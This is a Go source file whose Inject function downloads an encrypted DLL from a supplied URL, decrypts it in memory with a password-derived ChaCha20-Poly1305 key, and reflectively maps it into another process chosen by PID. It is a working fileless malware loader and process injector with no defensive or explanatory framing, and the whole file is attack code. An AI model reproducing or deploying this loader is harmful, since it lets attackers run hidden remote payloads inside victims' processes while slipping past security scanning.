package main

import (
	"errors"
	"io"
	"net/http"
	"reflectivePEdll/pkg/manualmap"

	"golang.org/x/crypto/chacha20poly1305"

	"golang.org/x/crypto/blake2b"
)

func Inject(pid int, addr, password string) error {

	resp, err := http.Get(addr)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	encryptedPe, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	if len(encryptedPe) < chacha20poly1305.NonceSize {
		return errors.New("fetched cipher text is too small")
	}

	// Split nonce and ciphertext.
	nonce, ciphertext := encryptedPe[:chacha20poly1305.NonceSize], encryptedPe[chacha20poly1305.NonceSize:]

	kd := blake2b.Sum256([]byte(password))

	aead, err := chacha20poly1305.New(kd[:])
	if err != nil {
		return err
	}

	// Decrypt the message and check it wasn't tampered with.
	plaintext, err := aead.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return err
	}

	return manualmap.MemoryLoadLibrary(plaintext, pid)
}
